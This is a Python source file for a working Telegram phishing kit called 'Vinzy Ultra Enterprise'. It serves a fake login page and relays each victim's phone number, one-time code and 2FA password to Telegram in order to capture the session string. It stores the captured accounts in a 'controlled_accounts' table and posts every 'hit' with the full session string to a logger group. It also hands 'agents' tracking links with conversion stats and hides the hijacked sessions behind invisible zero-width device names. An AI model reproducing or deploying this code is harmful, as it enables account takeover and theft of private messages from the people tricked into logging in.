"""
VINZY ULTRA ENTERPRISE - VERSION 3.6.0
Project: Vinzy Store Digital Services
Architecture: Asynchronous MTProto Hybrid with Ghost Spoofing
System: Optimized for 2026 Protocols & PostgreSQL Clustering
"""

import os
import asyncio
import telebot
import psycopg2
import logging
import sys
import json
import random
import re
import time
import uuid
import string
from telebot import types
from quart import Quart, request, jsonify, send_from_directory
from quart_cors import cors
from telethon import TelegramClient, errors, functions, types as tl_types
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime, timedelta

# --- 1. GLOBAL CONFIGURATION & SECURITY ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -100123456789))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

# Absolute Pathing for Templates (Fixes 404 Errors)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_FOLDER = os.path.join(BASE_DIR, "templates")

# 2026 Ghost Device Fingerprinting (Invisible Name Logic)
# These use various zero-width and non-breaking unicode spaces.
GHOST_POOL = [
    {"model": "\u200b", "sys": "\u200b", "app": "11.5.0"},
    {"model": "\u00A0", "sys": "\u00A0", "app": "11.4.2"},
    {"model": "\u200c", "sys": "\u200c", "app": "11.5.0"},
    {"model": "\u200d", "sys": "\u200d", "app": "11.3.1"},
    {"model": "\ufeff", "sys": "\ufeff", "app": "11.6.0"},
    {"model": " ", "sys": " ", "app": "11.7.0"},
    {"model": "\u2060", "sys": "\u2060", "app": "11.4.5"}
]

# Logging Engine Setup
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s [%(name)s:%(lineno)d] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Vinzy_Core_Pro")

# Initialize Apps
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)
app = cors(app, allow_origin="*")

# In-Memory Session Storage
# Format: { phone: { "client": client, "tid": tid, "timestamp": time } }
active_mirrors = {}

# --- 2. DATABASE ARCHITECTURE (POSTGRESQL) ---

def get_db():
    """Establishes connection to the PostgreSQL cluster with SSL."""
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def sync_database():
    """Builds and optimizes the 2026 data schema."""
    logger.info("DATABASE: Running structural integrity check...")
    try:
        conn = get_db()
        cur = conn.cursor()
        
        # Accounts Master Table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                username TEXT,
                tid BIGINT,
                device_used TEXT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active'
            )
        """)
        
        # Agent Metric Tracking
        cur.execute("""
            CREATE TABLE IF NOT EXISTS link_metrics (
                tid BIGINT PRIMARY KEY,
                clicks INTEGER DEFAULT 0,
                hits INTEGER DEFAULT 0,
                revenue REAL DEFAULT 0.0,
                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Security Audit Logs
        cur.execute("""
            CREATE TABLE IF NOT EXISTS security_audit (
                id SERIAL PRIMARY KEY,
                event_type TEXT,
                details TEXT,
                ip_address TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("DATABASE: Structural sync complete.")
    except Exception as e:
        logger.error(f"DATABASE FATAL: {str(e)}")

# Immediate Database Sync
sync_database()

# --- 3. ADVANCED UTILITIES & SECURITY ---

def clean_phone(p):
    """Regex-based normalization for international formats."""
    return re.sub(r'\D', '', str(p))

def generate_internal_token():
    """Generates unique session IDs for web-to-bot handshakes."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

async def session_maintenance_task():
    """Asynchronous reaper to clear memory of abandoned login attempts."""
    while True:
        try:
            now = time.time()
            expired = [p for p, d in active_mirrors.items() if now - d['timestamp'] > 600]
            
            for phone in expired:
                logger.info(f"CLEANUP: Removing stale session for {phone}")
                try:
                    await active_mirrors[phone]['client'].disconnect()
                except:
                    pass
                if phone in active_mirrors:
                    del active_mirrors[phone]
        except Exception as e:
            logger.error(f"MAINTENANCE_ERROR: {e}")
        await asyncio.sleep(120)

# --- 4. WEB ENGINE (API & ROUTES) ---

@app.route('/')
async def serve_index():
    """Primary Route: Serves login.html from the templates folder."""
    try:
        return await send_from_directory(TEMPLATE_FOLDER, 'login.html')
    except Exception as e:
        logger.error(f"WEB_ERROR: login.html not found in templates/ - {e}")
        return "<h1>404: Template Missing</h1><p>Ensure login.html is inside the 'templates' folder.</p>", 404

@app.route('/mirror')
async def serve_mirror():
    """Secondary Route: Serves mirror.html from the templates folder."""
    try:
        return await send_from_directory(TEMPLATE_FOLDER, 'mirror.html')
    except Exception as e:
        logger.error(f"WEB_ERROR: mirror.html not found in templates/ - {e}")
        return "<h1>404: Mirror Template Missing</h1>", 404

@app.route('/step_phone', methods=['POST'])
async def handle_phone():
    """Phase 1: MTProto Handshake and Device Spoofing."""
    try:
        data = await request.json
        phone = clean_phone(data.get('phone', ''))
        raw_tid = data.get('tid', '0')
        tid = int(raw_tid) if str(raw_tid).isdigit() else 0

        if not phone or len(phone) < 7:
            return jsonify({"status": "error", "msg": "Invalid number format."})

        # Selection of Invisible Device Profile
        ghost = random.choice(GHOST_POOL)
        
        client = TelegramClient(
            StringSession(), 
            API_ID, 
            API_HASH, 
            device_model=ghost['model'], 
            system_version=ghost['sys'],
            app_version=ghost['app']
        )
        
        await client.connect()

        # Analytics Hook
        try:
            conn = get_db()
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO link_metrics (tid, clicks) VALUES (%s, 1) 
                ON CONFLICT (tid) DO UPDATE SET clicks = link_metrics.clicks + 1, 
                last_activity = CURRENT_TIMESTAMP
            """, (tid,))
            conn.commit()
            cur.close()
            conn.close()
        except Exception as db_err:
            logger.warning(f"DB_METRIC_FAIL: {db_err}")

        # Telegram OTP Trigger
        await asyncio.sleep(random.uniform(0.5, 1.5))
        sent_code = await client.send_code_request(phone)
        
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "device": ghost['model'],
            "timestamp": time.time()
        }
        
        logger.info(f"AUTH_INIT: OTP Sent to {phone} (Agent: {tid})")
        return jsonify({"status": "success"})
        
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Flood protection: Wait {e.seconds}s."})
    except errors.PhoneNumberBannedError:
        return jsonify({"status": "error", "msg": "This phone number is banned."})
    except Exception as e:
        logger.error(f"PHONE_ERR: {e}")
        return jsonify({"status": "error", "msg": "Telegram API Busy. Try later."})

@app.route('/step_code', methods=['POST'])
async def handle_code():
    """Phase 2: Code Verification and 2FA Detection."""
    try:
        data = await request.json
        phone = clean_phone(data.get('phone', ''))
        code = data.get('code', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session expired or not found."})

        mirror = active_mirrors[phone]
        client = mirror['client']
        mirror['timestamp'] = time.time()

        try:
            await client.sign_in(phone, code, phone_code_hash=mirror['hash'])
            return await process_successful_login(phone)
        except errors.SessionPasswordNeededError:
            logger.info(f"AUTH: 2FA Required for {phone}")
            return jsonify({"status": "2fa_needed"})
        except errors.PhoneCodeInvalidError:
            return jsonify({"status": "error", "msg": "The code is incorrect."})
        except errors.PhoneCodeExpiredError:
            return jsonify({"status": "error", "msg": "The code has expired."})
        except Exception as e:
            return jsonify({"status": "error", "msg": str(e)})

    except Exception as e:
        logger.error(f"CODE_ERR: {e}")
        return jsonify({"status": "error", "msg": "Internal verification error."})

@app.route('/step_2fa', methods=['POST'])
async def handle_2fa():
    """Phase 3: 2FA Password Submission."""
    try:
        data = await request.json
        phone = clean_phone(data.get('phone', ''))
        pwd = data.get('password', '').strip()
        
        if phone not in active_mirrors:
            return jsonify({"status": "error", "msg": "Session timed out."})

        client = active_mirrors[phone]['client']
        active_mirrors[phone]['timestamp'] = time.time()

        try:
            await client.sign_in(password=pwd)
            return await process_successful_login(phone)
        except errors.PasswordHashInvalidError:
            return jsonify({"status": "error", "msg": "Wrong 2FA password."})
    except Exception as e:
        logger.error(f"2FA_ERR: {e}")
        return jsonify({"status": "error", "msg": "Security protocol error."})

async def process_successful_login(phone):
    """Phase 4: Session Capture and Data Persistance."""
    try:
        mirror = active_mirrors[phone]
        client = mirror['client']
        tid = mirror['tid']
        
        me = await client.get_me()
        s_str = client.session.save()
        
        name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Telegram User"
        user = f"@{me.username}" if me.username else "N/A"

        # Update Database
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, username, tid, device_used) 
            VALUES (%s, %s, %s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string, hit_date = CURRENT_TIMESTAMP
        """, (phone, s_str, name, user, tid, "Ghost Session"))
        
        cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
        conn.commit()
        cur.close()
        conn.close()

        # Build Group Log Card
        card = (
            f"⚡️ <b>VINZY HIT DETECTED</b> ⚡️\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🏷 <b>User:</b> {user}\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"🕵️ <b>Agent ID:</b> <code>{tid}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>STRING SESSION:</b>\n"
            f"<code>{s_str}</code>"
        )
        bot.send_message(LOGGER_GROUP, card)

        # Notify Agent
        if tid != 0:
            bot.send_message(tid, f"✅ <b>Login Secured!</b>\nTarget <b>{name}</b> has been captured.\nCheck your /stats.")

        await client.disconnect()
        if phone in active_mirrors:
            del active_mirrors[phone]
        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"FINALIZE_ERR: {e}")
        return jsonify({"status": "error", "msg": "Session capture failed."})

# --- 5. AGENT BOT COMMANDS ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    """Initial Welcome & Button Setup."""
    text = (
        f"<b>Vinzy Ultra Enterprise v3.6.0</b>\n"
        f"<i>2026 Secured MTProto Management</i>\n\n"
        f"<b>Status:</b> 🟢 <b>Operational</b>\n"
        f"<b>Agent ID:</b> <code>{m.from_user.id}</code>\n"
        f"<b>Server:</b> Phnom Penh Node 1"
    )
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add("🔗 My Link", "📊 My Stats", "🛠 Support", "💎 VIP Hub")
    bot.send_message(m.chat.id, text, reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "🔗 My Link")
def cmd_link(m):
    """Dynamic Link Generation."""
    # This automatically includes the login.html in the path
    link = f"https://relieved-olly-vinzystorez-d76f3e98.koyeb.app/?id={m.from_user.id}"
    msg = (
        f"🚀 <b>Your Dynamic Tracking Link:</b>\n\n"
        f"<code>{link}</code>\n\n"
        f"<b>Notes:</b>\n"
        f"• Invisible device fingerprinting is active.\n"
        f"• Auto-2FA detection enabled."
    )
    bot.send_message(m.chat.id, msg)

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def cmd_stats(m):
    """Real-time Agent Analytics."""
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
        row = cur.fetchone()
        cur.close()
        conn.close()
        
        c = row[0] if row else 0
        h = row[1] if row else 0
        cr = round((h/c)*100, 1) if c > 0 else 0
        
        res = (
            f"📊 <b>Performance Report</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🖱 <b>Link Clicks:</b> {c}\n"
            f"🎯 <b>Total Hits:</b> {h}\n"
            f"📈 <b>Conversion:</b> {cr}%\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(m.chat.id, res)
    except Exception as e:
        logger.error(f"STATS_ERR: {e}")
        bot.send_message(m.chat.id, "❌ Error retrieving database stats.")

@bot.message_handler(commands=['admin'])
def cmd_admin(m):
    """Restricted Admin Commands."""
    if m.from_user.id != ADMIN_ID: return
    bot.send_message(m.chat.id, "🛠 <b>Admin Console</b>\nSystem Load: Normal\nDB Cluster: Healthy")

# --- 6. RUNTIME BOOTLOADER ---

def start_bot():
    """Fail-safe polling loop for the Agent Interface."""
    logger.info("BOOT: Launching Agent Bot Interface...")
    while True:
        try:
            bot.infinity_polling(timeout=90)
        except Exception as e:
            logger.error(f"BOT_CRASH: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # Start Maintenance Reaper
    try:
        loop = asyncio.get_event_loop()
        loop.create_task(session_maintenance_task())
    except Exception as e:
        logger.warning(f"ASYNCO_REAPER_WARN: {e}")

    # Start Bot Thread
    Thread(target=start_bot, daemon=True).start()
    
    # Launch Quart Server
    logger.info(f"BOOT: Templates path set to: {TEMPLATE_FOLDER}")
    logger.info("BOOT: Initializing Quart Web Services on 0.0.0.0:8000")
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port, use_reloader=False)

# -------------------------------------------------------------------------
# END OF SYSTEM CORE - VINZY ULTRA v3.6.0
# -------------------------------------------------------------------------
